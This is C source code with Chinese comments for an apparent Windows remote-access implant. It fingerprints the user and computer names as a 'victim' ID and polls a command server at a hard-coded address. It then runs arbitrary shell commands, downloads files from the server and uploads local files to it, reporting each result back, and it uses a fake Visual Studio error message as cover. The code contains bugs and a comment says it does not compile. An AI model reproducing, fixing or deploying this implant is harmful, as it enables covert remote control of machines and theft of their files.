#include<stdio.h>
#include<stdlib.h>
#include <windows.h>
#include<string.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <curl/curl.h> 
// 因為是另外引用的所以編譯的時候要用下面的格式
// gcc <your_program.c> -o <your_program> -I D:\Setup\curl-8.10.1_3-win64-mingw\include -L D:\Setup\curl-8.10.1_3-win64-mingw\lib -libcurl
// 結果用了還是爛掉無法編譯

char userName[100];
DWORD username_len = 100;
char computerName[100];
DWORD computername_len = 100;
char C2ServerLink[] = "http://192.168.50.1:443";
char command[256];
char victim[5];

int isXMLexist();
int getComputerInfo();
size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data);
void sendGetRequest(char *victimID, char *meth);
void sendPostRequest(char *cmdNum, char *cmdResult);
size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream);
void sendGetDownload(char *arg1, char *arg2);
void sendPostFileUpload(char *arg);


int main(){
    // 檢查是否存在 update.xml
    int xmlflag = isXMLexist();
    if(xmlflag == 0){
        exit(EXIT_FAILURE);
    }

    // 獲取電腦資訊
    int infoflag = getComputerInfo();
    // printf("infoFlag is: %d\n", infoflag);
    if(infoflag == 0){
        exit(EXIT_FAILURE);
    }
    // printf("username: %s, hostname: %s", userName, computerName);

    // 建立受害者 ID
    victim[0] = userName[0];
    victim[1] = userName[1];
    victim[2] = computerName[0];
    victim[3] = computerName[1];

    // 建立 GET 連線獲取命令
    sendGetRequest(victim, "search");
    //             ID, method
    
    // 解除封印
    char *temp = strstr(command, "|");
    // command number | command ID | arg
    //                ^
    if(temp == NULL){
        fprintf(stderr, "Something wrong when finding command number\n");
        exit(0);
    }
    int commandNumberlength = strlen(command) - strlen(temp);
    char *temp2 = temp + 1;
    char *tmp = strstr(temp2, "|");
    // command ID | arg
    //            ^
    if(tmp == NULL){
        fprintf(stderr, "Something wrong when finding command number\n");
        exit(0);
    }
    int commandIDlength = strlen(temp) - strlen(tmp);
    char commandNumber[5];
    strncpy(commandNumber, command, commandNumberlength);
    char *arg = tmp + 1;
    int cmdNum = atoi(commandNumber);
    if(cmdNum == -1){
        exit(0);
    }
    else{
        // 回傳格式是 cmdNum:result
        // 為了方便所以沒有做加密
        switch (cmdNum)
        {
        case 101:
            // 執行 arg shell 指令
            FILE *fp;
            char buffer[500];
            fp = popen(arg, "r");
            // 參考
            // https://www.cnblogs.com/hustquan/archive/2011/07/20/2111896.html
            fget(buffer, sizeof(buffer), fp);
            printf("%s\n", buffer);
            // 這邊做回傳通訊，回傳值是 buffer
            pclose(fp);
            sendPostRequest("101", buffer);
            break;

        case 102:
            // 下載檔案，arg2 是遠端檔案路徑， arg1 是本地路徑
            // 方便起見 arg2 只給 /download/ 後面要接的內容好了
            char *switchTemp = strstr(arg, "|");
            int arg1Length = strlen(arg) - strlen(switchTemp);
            char *arg1[100];
            strncpy(arg1, arg, arg1Length);
            char *arg2 = switchTemp + 1;
            sendGetDownload(arg1, arg2);
            break;

        case 103:
            // 上傳檔案，arg 是本地檔案路徑
            sendPostFileUpload(arg);
            break;

        case 104:
            // 和 101 一樣
            FILE *fp;
            char buffer[500];
            fp = popen(arg, "r");
            fget(buffer, sizeof(buffer), fp);
            printf("%s\n", buffer);
            pclose(fp);
            sendPostRequest("104", buffer);
            break;
        
        default:
            break;
        }
    }
    
}   

int isXMLexist(){
    int exist = 1;
    FILE* fileCheck = fopen("update.xml", "r");
    if(!fileCheck){
        fprintf(stderr, "Please install visual studio 2017 and try again");
        // exit(EXIT_FAILURE);
        exist = 0;
    }
    fclose(fileCheck);
    return exist;
}

int getComputerInfo(){
    if(GetUserName(userName, &username_len)){
        if(GetComputerName(computerName, &computername_len)){
            // printf("username is: %s, computername is: %s", userName, computerName);
            return 1;
        }
        else{
            fprintf(stderr, "Failed to get the Computername");
            // printf("Failed to get the Computername");
            // exit(EXIT_FAILURE);
            return 0;
        }
    }
    else{
        fprintf(stderr, "Failed to get the Username");
        // printf("Failed to get the Username");
        // exit(EXIT_FAILURE);
        return 0;
    }

}

// 回調函數，處理接收到的數據
size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data) {
    // 計算實際接收到的數據大小
    size_t realsize = size * nmemb;
    
    // 將接收到的數據附加到 data 變數中
    strncat(data, ptr, realsize);
    return realsize; // 返回實際寫入的字節數
}

void sendGetRequest(char *victimID, char *meth){
    CURL *curl;
    CURLcode res;
    size_t temp;

    char searchURL[100];
    strcat(searchURL, C2ServerLink);
    strcat(searchURL, "/");
    strcat(searchURL, meth);
    strcat(searchURL, "/");
    strcat(searchURL, victimID);

    // 儲存回應資料的緩衝區
    char response[4096] = "";

    curl = curl_easy_init();
    if(curl) {
        // 設定 URL
        curl_easy_setopt(curl, CURLOPT_URL, searchURL);
        // 這邊網址後面要多加下載的參數

         // 設置回調函數以處理接收到的數據
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        
        // 設置用戶資料，傳遞緩衝區
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        // 發送 GET 請求
        res = curl_easy_perform(curl);

        // 檢查請求是否成功
        if(res != CURLE_OK) {
            fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(res));
        } else {
            // printf("GET request success!\n");
            // 在這裡處理回的文字

            char *start = strstr(response, "<script>");
            if(start == NULL){
                fprintf(stderr, "Cannot find <script>\n");
            }
            char *end = strstr(start, "</script>");
            if(end == NULL){
                fprintf(stderr, "Cannot find </script>\n");
            }
            int length = strlen(start) - strlen(end);
            strncpy(command, start, length);
            // printf("command is: %s\n", command);
        }

        // 釋放資源
        curl_easy_cleanup(curl);
    }
}

void sendPostRequest(char *cmdNum, char *cmdResult){
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {

        char URL[150];
        strcat(URL, C2ServerLink);
        strcat(URL, "/search/");
        strcat(URL, victim);

        // 設定 URL
        curl_easy_setopt(curl, CURLOPT_URL, URL);

        // 明確設置為 POST 請求
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        // 設置要發送的 POST 數據
        char *postData[150];
        strcat(postData, "{\"");
        strcat(postData, cmdNum);
        strcat(postData, ":");
        strcat(postData, cmdResult);
        strcat(postData, "\"}");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);

        // 發送 POST 請求
        res = curl_easy_perform(curl);

        // 檢查請求是否成功
        if(res != CURLE_OK) {
            fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("POST request success!\n");
        }

        // 釋放資源
        curl_easy_cleanup(curl);
    }
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void sendGetDownload(char *arg1, char *arg2){
    // arg1: 本機位置, arg2: 遠端檔案位置
    // arg1 為完整路徑, arg2 僅有後面檔案
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char URL[150];
    strcat(URL, C2ServerLink);
    strcat(URL, "/download/");
    strcat(URL, arg2);
    int flag = 0;

    fp = fopen(arg1, "wb");
    if (fp == NULL) {
        fprintf(stderr, "Failed to open file %s for writing.\n", arg1);
        return;
    }

    curl = curl_easy_init();
    if (curl) {
        // 設定要下載的 URL
        curl_easy_setopt(curl, CURLOPT_URL, URL);

        // 設定回調函數，將數據寫入檔案
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);

        // 設定寫入檔案的檔案指標
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        // 發送請求，開始下載
        res = curl_easy_perform(curl);

        // 檢查是否成功下載
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            flag = 0;
        } else {
            // printf("Download successful! File saved to: %s\n", arg1);
            flag = 1;
        }

        // 清理 curl 資源
        curl_easy_cleanup(curl);
    }

    // 關閉檔案
    fclose(fp);
    if(flag)
        sendPostRequest("102", "DownloadSuccess");
    else
        sendPostRequest("102", "DownloadFailure");
}

void sendPostFileUpload(char *arg){
    // arg: file address
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    curl_off_t speed_upload, total_time;
    FILE *fd;
    int flag = 0;
    fd = fopen(arg, "rb"); /* open file to upload */
    if(!fd){
        fprintf(stderr, "File upload failed: cannot open the file\n");
        return; /* cannot continue */
    }
        
    /* to get the file size */
    if(fstat(fileno(fd), &file_info) != 0){
        fprintf(stderr, "File upload failed: cannot count the file size\n");
        return 1; /* cannot continue */
    }

    curl = curl_easy_init();
    char URL[150];
    strcat(URL, C2ServerLink);
    strcat(URL, "/upload");
    if(curl) {
        /* upload to this place */
        curl_easy_setopt(curl, CURLOPT_URL, URL);

        /* tell it to "upload" to the URL */
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* set where to read from (on Windows you need to use READFUNCTION too) */
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);

        /* and give the size of the upload (optional) */
        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,
                            (curl_off_t)file_info.st_size);

        /* enable verbose for easier tracing */
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
                    flag = 0;
        }
        else {
            /* now extract transfer info */
            curl_easy_getinfo(curl, CURLINFO_SPEED_UPLOAD_T, &speed_upload);
            curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME_T, &total_time);

            fprintf(stderr, "Speed: %lu bytes/sec during %lu.%06lu seconds\n",
                    (unsigned long)speed_upload,
                    (unsigned long)(total_time / 1000000),
                    (unsigned long)(total_time % 1000000));
            flag = 1;
        }
        /* always cleanup */
        curl_easy_cleanup(curl);
    }
    fclose(fd);
    if(flag)
        sendPostRequest("103", "UploadSuccess");
    else
        sendPostRequest("103", "UploadFailure");
}